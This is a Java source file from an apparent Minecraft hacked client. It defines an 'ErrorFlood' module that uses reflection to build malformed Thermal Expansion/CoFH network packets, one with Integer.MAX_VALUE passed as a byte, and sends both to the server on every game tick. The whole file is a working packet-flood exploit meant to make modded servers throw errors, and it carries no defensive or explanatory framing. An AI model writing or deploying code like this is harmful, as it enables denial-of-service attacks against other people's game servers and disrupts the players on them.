package ru.zaxar163.hacks;

import java.lang.reflect.Method;

import org.lwjgl.input.Keyboard;

import ru.yammi.eventsystem.EventTarget;
import ru.yammi.eventsystem.events.UpdateEvent;
import ru.yammi.modulesystem.ModuleCategory;

public class ErrorFlood extends PacketHackModule {
	private Object packet;
	private Object packet2;
	private Method method;

	public ErrorFlood() {
		super("ErrorFlood", ModuleCategory.MISC);
		super.setKeybind(Keyboard.KEY_I);
	}

	@Override
	public void prepare() throws Throwable {
		packet = Class.forName("cofh.thermalexpansion.network.PacketTEBase").newInstance();
		packet2 = Class.forName("cofh.core.network.PacketBase").getMethod("addByte", int.class)
				.invoke(Class.forName("cofh.thermalexpansion.network.PacketTEBase").newInstance(), Integer.MAX_VALUE);
		method = Class.forName("cofh.core.network.PacketHandler").getMethod("sendToServer",
				Class.forName("cofh.core.network.PacketBase"));
	}

	@EventTarget
	public void onUpdate(UpdateEvent oTTDuKOxgEObFPc2) {
		if (super.workable && getState())
			try {
				method.invoke(null, packet);
				method.invoke(null, packet2);
			} catch (Exception e) {
			}
	}

	@Override
	public void onEnable() {
	}

	@Override
	public void run() {
	}
}
